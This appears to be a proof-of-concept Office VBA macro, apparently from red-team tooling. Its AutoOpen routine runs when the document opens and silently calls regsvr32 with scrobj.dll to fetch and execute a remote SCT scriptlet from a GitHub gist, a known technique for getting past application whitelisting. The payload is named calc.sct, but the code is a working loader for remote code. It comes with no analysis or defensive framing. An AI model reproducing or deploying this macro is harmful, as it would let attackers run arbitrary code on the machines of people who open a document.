Sub AutoOpen()

' https://gist.github.com/mgeeky/9dee0ac86c65cdd9cb5a2f64cef51991
' SCT template from @subtee

Dim shell
Dim out
Set shell = VBA.CreateObject("WScript.Shell")
out = shell.Run("regsvr32 /u /n /s /i:https://gist.githubusercontent.com/S3cur3Th1sSh1t/48545ed0461324b6c210c18a8c7dc5d1/raw/36958a854312a615b0655ab998a546e7986e5de5/calc.sct scrobj.dll", 0, False)

End Sub

